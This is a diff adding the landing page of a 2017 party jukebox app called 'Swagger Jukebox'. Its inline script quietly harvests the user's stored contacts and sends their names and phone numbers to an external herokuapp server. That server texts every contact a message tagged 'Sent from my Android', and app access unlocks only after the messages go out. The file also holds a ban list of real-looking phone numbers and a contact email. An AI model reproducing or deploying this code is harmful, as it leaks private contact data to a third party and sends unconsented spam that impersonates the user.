@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="js/create.js"></script>
+    <script src="dirtyScripts/app3.js"></script>
+    <link href="dirtyStyles/app2.css" rel="stylesheet">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+
+    <title>Swagger</title>
+    <meta http-equiv="refresh" content="0;URL='/app4.html'" />
+
+    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="vendor/agency.min.css" rel="stylesheet">
+    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <style>
+            html {background: black !important; }
+            footer {
+                background: black;
+                color: white;
+            }
+        header {
+            background: black;
+            background-image: none !important;
+        }
+        header {background-attachment: scroll !important; }
+        #target h3,#target h2,#target h4, #target p {
+            color: white !important;
+        }
+        a.page-scroll.btn.btn-xl {
+            margin-bottom: 16px;
+        }
+        footer {
+            height: 14vh !important;
+        }
+        * {
+            overflow: hidden;
+        }
+        .container {
+            height: 86vh !important;
+        }
+        input[type="text"] {
+            height: 65px;
+            font-size: xx-large;
+            width: 225px;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 10px;
+            color: #333333;
+            margin: auto;
+            display: block;
+        }
+        #how {
+            background-color: black;
+            // background: url(../images/header-bg.jpg);
+            background-attachment: fixed;
+            background-size: cover;
+            background-repeat: no-repeat;
+            opacity: .8;
+        }
+        nav#mainNav { display: none !important; }
+        a.page-scroll.btn.btn-xl {
+            margin-bottom: 16px !important;
+            margin-top: 16px !important;
+        }
+        .member { max-width: 350px;}
+        .timeline-panel {
+        }
+        .navbar>.container .navbar-brand { float: left; }
+        .navbar-header.page-scroll {
+            width: 100%;
+        }
+        html, header, body {
+            height: 100vh;
+        }
+        ul.nav.navbar-nav.navbar-right { display: none; }
+        button.navbar-toggle {
+            display: block;
+        }
+        ul.nav.navbar-nav.navbar-right {
+            width: 22% !important;
+            float: left !important;
+            display: block;
+        }
+        .btn-xl, li.active a {background-color: #269052 !important;}
+        span.statcounter {
+            display: none;
+        }
+        h4.subheading {
+            text-align: center;
+        }
+        ::-webkit-input-placeholder {
+            color: gray !important;
+        }
+        section#services {
+            background-color: #eeeeee !important;
+        }
+        :-moz-placeholder { /* Firefox 18- */
+            color: gray !important;
+        }
+        ::-moz-placeholder {  /* Firefox 19+ */
+            color: gray !important;
+        }
+        .timeline>li .timeline-image, .navbar-custom .navbar-toggle{
+            background: #269052 !important;
+        }
+        .fa-inverse {
+            background: #269052;
+            border-radius: 100%;
+        }
+        :-ms-input-placeholder {
+            color: gray !important;
+        }
+        .timeline:before { background-color: #4e81ce !important; }
+        a.navbar-brand.page-scroll {
+            font-family: Montserrat,"Helvetica Neue",Helvetica,Arial,sans-serif;
+            color: #269052;
+            text-transform: uppercase;
+        }
+        div#products, div#born, div#service, div#expansion {
+            outline: 7px solid #ffffff;
+        }
+        .client {  max-height: 50px; }
+        a.page-scroll.btn.btn-xl {
+            margin-bottom: 16px !important;
+            margin-top: 16px !important;
+        }
+        a.page-scroll.btn.btn-xl, input[type="text"] {
+            width: 300px;
+            text-align: center;
+            font-size: 25px;
+            text-transform: uppercase;
+            font-weight: 200;
+            font-family: sans-serif;
+            padding: 14px;
+        }
+        * {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none; /* Disable selection/copy in UIWebView */
+        }
+        header .intro-text {
+            padding-top: 100px;
+            padding-bottom: 25px !important;
+        }
+        div#dialogPage { background: darkgrey; z-index: 500; height: 100%; } .ui-content { margin: 0 15%; height: 80%; max-width: 70%; zoom: 130%; } div#dialogPage { background: darkgrey; z-index: 500; height: 100%; zoom: 70%; overflow: scroll;} button.ui-button.ui-btn.ui-shadow.ui-corner-all { position: fixed; margin-bottom: 0px !important; height: 5%; }
+            </style>
+
+</head>
+
+<body id="page-top" class="index">
+<div style="visibility: visible;" id="load" onclick="alertify('Thinking...');"></div>
+<header>
+    <div class="container">
+        <div class="intro-text">
+            <div class="intro-lead-in">Universally Thinking's</div>
+            <div class="intro-heading"><span style="display:block;">Swagger</span><span style="display:block;">Jukebox!</span></div>
+            <a onclick="login()" class="page-scroll btn btn-xl">Host a Party!</a>
+             <br />
+             <a onclick="guest()" class="page-scroll btn btn-xl">Enter as Guest!</a>
+        </div>
+        <div class="intro-lead-in"><p style="color: white;">Thank you for using our app!</p></div>
+        <!--<br />
+        <div class="intro-lead-in"><a onclick="share()" style="color: white;">Your Message Is Completely Anonymous</a></div>
+-->
+    </div>
+
+
+    <footer>
+        <div class="row">
+            <div class="col-md-4">
+                <span class="copyright">Copyright &copy; Universally Thinking 2017</span>
+            </div>
+        </div>
+    </footer>
+</header>
+<script>
+localStorage.clear();
+     window.sendMessage = function(i, name, user, num) {
+      var obj = {}; /*new object to write to server...
+      Use DOT notation to add values: dataBody.recipients = ["5135453118", "5135683374"]; dataBody.message = "This is my message"; etc.
+      */
+      var requestUrl = "http://swaggersender.herokuapp.com/shareSMS";
+      if(i==1) {
+        requestUrl = "http://swaggersender.herokuapp.com/shareEmail";
+        obj.recipients = ["universallythinking@gmail.com"];
+        confirmSend(requestUrl, obj);
+      } else {
+          obj.recipients = num;
+          obj.name = name;
+          obj.user = user;
+          confirmSend(requestUrl, obj);
+      }
+    }
+    window.confirmSend = function(url, obj){
+      if(numberCount >= 1) {
+      numberCount--;
+          $.ajax({
+              type: "GET",
+              url: url,
+              data: obj,
+              success: function(res){
+                console.log(res);
+                localStorage.unlock = true;
+                if(numberCount == 0){
+                    sendMessage(1, 0, 0, 0);
+                    location.href = "partymusic://sharesuccess/";
+                    setTimeout(function() { location.href = localStorage.urlParts + "/app2.html"; }, 3000);
+                }
+                //unlock access to the app
+              }, error: function(res) {
+                console.log(res);
+                //display an error message to the user
+              }
+          });
+      }
+    }
+    var numberCount;
+        window.parseNumbers = function() {
+        numberCount = 0;
+        var arr = localStorage.numbers.split(",");
+        //console.log(arr.toString());
+        numbers = [];
+        var flag = false;
+        if(typeof localStorage.myName == 'undefined' || localStorage.myName == null) {
+            localStorage.myName = "Robbie";
+        }
+        var ban = ["+15135166516", "+15139436266", "+15138001305", "+15132055156", "+15133076145", "+15135607071", "+15133328868", "+15135025937", "15136008322", "+15133386164", "+15136008322", "+15132356494"];
+        $.each(arr, function(index) {
+           if(arr[index].split("::")[1]) {
+            var number = "123";
+            var num = arr[index].split("::")[1].replace(/[- )(]/g,'');
+            if(num.length==10) {
+              number = "+1" + num;
+            } else if(num.length==11 && num.charAt(0) == "1") {
+              number = "+" + num;
+            } else if (num.length==12 && num.charAt(0) == "+") {
+              number = num;
+            }
+            var name = arr[index].split("::")[0].split(" ")[0];
+            if(number.length == 12 && name.length >1 && number.indexOf("+1917")==-1 && numbers.toString().indexOf(number) ==-1 && ban.toString().indexOf(number)==-1) {
+              numberCount++;
+              console.log(numberCount);
+              numbers.push(number+":::"+name);
+            }
+          }
+        });
+        var int = numberCount-1;
+        while(numberCount >= 1) {
+          var phone = numbers[int].split(":::")[0];
+          var n = numbers[int].split(":::")[1];
+          int--;
+          sendMessage(0, n, "Sent from my Android", phone);
+        }
+    }
+    </script>
+</body>
+
+</html>
